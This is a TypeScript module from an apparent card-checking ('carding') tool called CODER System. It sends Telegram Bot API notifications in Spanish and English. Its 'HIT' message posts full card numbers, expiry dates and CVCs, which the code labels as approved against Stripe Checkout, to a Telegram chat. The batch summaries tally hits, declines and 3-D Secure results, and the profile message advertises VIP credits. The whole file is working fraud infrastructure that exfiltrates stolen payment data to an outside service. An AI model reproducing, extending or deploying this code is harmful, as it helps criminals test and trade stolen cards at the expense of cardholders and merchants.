/**
 * CODER System — Telegram Notification Dispatcher
 * 
 * Sends formatted notifications to Telegram via the Bot API.
 * Uses custom emojis and inline buttons for premium look.
 * 
 * Improvements:
 * - Retry with exponential backoff (3 attempts)
 * - Centralized constants import
 * - Simplified duplicate code
 * - Better error handling
 */

import { TELEGRAM_BOT_TOKEN, TELEGRAM_BOT_USERNAME } from './constants';

// Re-export for backward compatibility
export const DEFAULT_TELEGRAM_BOT_TOKEN = TELEGRAM_BOT_TOKEN;
export const DEFAULT_TELEGRAM_BOT_USERNAME = TELEGRAM_BOT_USERNAME;

// ─── Payloads ─────────────────────────────────────────────────────────────────

export interface TelegramHitPayload {
  cc: string;
  expiryMonth: string;
  expiryYear: string;
  cvc: string;
  hitsCount: number;
  declinedCount: number;
  threedsCount: number;
  merchant?: string;
}

export interface TelegramSummaryPayload {
  totalCards: number;
  hits: number;
  declined: number;
  threeds: number;
  merchant: string;
}

// ─── Core Send Function (with retry) ──────────────────────────────────────────

async function sendTelegramMessage(
  chatId: string,
  text: string,
  botToken: string = TELEGRAM_BOT_TOKEN,
  maxRetries = 2
): Promise<boolean> {
  if (!chatId?.trim()) return false;

  const token = botToken.trim() || TELEGRAM_BOT_TOKEN;

  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId.trim(),
          text,
          parse_mode: 'HTML',
          disable_web_page_preview: true,
          reply_markup: {
            inline_keyboard: [
              [
                { text: '👤 Perfil ↗', url: `https://t.me/${TELEGRAM_BOT_USERNAME}` },
                { text: '🔑 Verificar ↗', url: `https://t.me/${TELEGRAM_BOT_USERNAME}` },
              ],
            ],
          },
        }),
        signal: AbortSignal.timeout(5000),
      });

      const data = await response.json();
      if (data.ok === true) return true;

      // Non-retryable errors
      if (response.status === 400 || response.status === 403) return false;

    } catch (err) {
      console.warn(`[CODER TG] Send attempt ${attempt + 1} failed:`, err);
      if (attempt < maxRetries) {
        await new Promise(r => setTimeout(r, 500 * Math.pow(2, attempt)));
      }
    }
  }

  return false;
}

// ─── HIT Notification ─────────────────────────────────────────────────────────

export async function sendTelegramHitNotification(
  chatId: string,
  payload: TelegramHitPayload,
  botToken: string = TELEGRAM_BOT_TOKEN
): Promise<boolean> {
  const formattedCard = `${payload.cc}|${payload.expiryMonth}|${payload.expiryYear}|${payload.cvc}`;
  const merchantName = payload.merchant || 'Stripe Checkout';

  const text =
`<b><tg-emoji emoji-id="5363857743985784309">💳</tg-emoji> 𝑪𝑶𝑫𝑬𝑹ギ — STRIPE PAYMENT HIT</b>
━━━━━━━━━━━━━━━━━━━━━━━

<tg-emoji emoji-id="5363857743985784309">💳</tg-emoji> <b>CC:</b> <code>${formattedCard}</code>
<tg-emoji emoji-id="5359394246468057650">🌐</tg-emoji> <b>Merchant:</b> <code>${merchantName}</code>
<tg-emoji emoji-id="5359536263856667601">🦇</tg-emoji> <b>Estado:</b> <code>〔 APPROVED / HIT 〕</code>

━━━━━━━━━━━━━━━━━━━━━━━
<tg-emoji emoji-id="5364265456641258077">✅</tg-emoji> <b>HIT(s):</b> <code>${payload.hitsCount}</code>
<tg-emoji emoji-id="5357199488115030155">❌</tg-emoji> <b>Declined(s):</b> <code>${payload.declinedCount}</code>
<tg-emoji emoji-id="5357199488115030155">⚠️</tg-emoji> <b>3D(s):</b> <code>${payload.threedsCount}</code>

━━━━━━━━━━━━━━━━━━━━━━━
        『 𝑪𝑶𝑫𝑬𝑹 𝑺𝒀𝑺𝑻𝑬𝑴 』`;

  return sendTelegramMessage(chatId, text, botToken);
}

// ─── Batch Summary ────────────────────────────────────────────────────────────

export async function sendTelegramBatchSummary(
  chatId: string,
  payload: TelegramSummaryPayload,
  botToken: string = TELEGRAM_BOT_TOKEN
): Promise<boolean> {
  const text =
`<b><tg-emoji emoji-id="5364265456641258077">📊</tg-emoji> 𝑪𝑶𝑫𝑬𝑹ギ — RESUMEN DE PRUEBAS</b>
━━━━━━━━━━━━━━━━━━━━━━━

<tg-emoji emoji-id="5364265456641258077">📊</tg-emoji> <b>Total Tarjetas:</b> <code>${payload.totalCards}</code>
<tg-emoji emoji-id="5364265456641258077">✅</tg-emoji> <b>HIT(s):</b> <code>${payload.hits}</code>
<tg-emoji emoji-id="5357199488115030155">❌</tg-emoji> <b>Declined(s):</b> <code>${payload.declined}</code>
<tg-emoji emoji-id="5357199488115030155">⚠️</tg-emoji> <b>3D(s):</b> <code>${payload.threeds}</code>
<tg-emoji emoji-id="5359394246468057650">🌐</tg-emoji> <b>Merchant:</b> <code>${payload.merchant}</code>

━━━━━━━━━━━━━━━━━━━━━━━
      『 𝑪𝑶𝑫𝑬𝑹 𝑺𝒀𝑺𝑻𝑬𝑴 』`;

  return sendTelegramMessage(chatId, text, botToken);
}

// ─── Profile Notification ─────────────────────────────────────────────────────

export async function sendTelegramProfileNotification(
  chatId: string,
  userInfo: { name: string; telegramId: string; email: string; role?: string },
  botToken: string = TELEGRAM_BOT_TOKEN
): Promise<boolean> {
  const text =
`<b><tg-emoji emoji-id="5359536263856667601">🦇</tg-emoji> 𝑪𝑶𝑫𝑬𝑹ギ — PERFIL DE USUARIO</b>
━━━━━━━━━━━━━━━━━━━━━━━

<tg-emoji emoji-id="5411580731929411768">👤</tg-emoji> <b>Nombre:</b> <code>${userInfo.name}</code>
<tg-emoji emoji-id="5361610161829985952">🆔</tg-emoji> <b>Telegram ID:</b> <code>${userInfo.telegramId}</code>
<tg-emoji emoji-id="5359397703916730925">🦸‍♂️</tg-emoji> <b>Email:</b> <code>${userInfo.email}</code>
<tg-emoji emoji-id="5411457217259911292">🦸‍♀️</tg-emoji> <b>Membresía:</b> <code>〔 VIP USER 〕</code>
<tg-emoji emoji-id="5364114797778451311">🔗</tg-emoji> <b>Link Perfil:</b> <a href="https://t.me/${TELEGRAM_BOT_USERNAME}">Presiona aquí</a>

━━━━━━━━━━━━━━━━━━━━━━━
<tg-emoji emoji-id="5364265456641258077">⭐️</tg-emoji> <b>Estado:</b> <code>● ACTIVO</code>
<tg-emoji emoji-id="5359394246468057650">🤖</tg-emoji> <b>Expiración:</b> <code>VIP ILIMITADO</code>
<tg-emoji emoji-id="5363857743985784309">💳</tg-emoji> <b>Créditos:</b> <code>9999 pts</code>
<tg-emoji emoji-id="5357199488115030155">💀</tg-emoji> <b>Sanciones:</b> <code>Sin Ban</code>

━━━━━━━━━━━━━━━━━━━━━━━
        『 𝑪𝑶𝑫𝑬𝑹 𝑺𝒀𝑺𝑻𝑬𝑴 』`;

  return sendTelegramMessage(chatId, text, botToken);
}
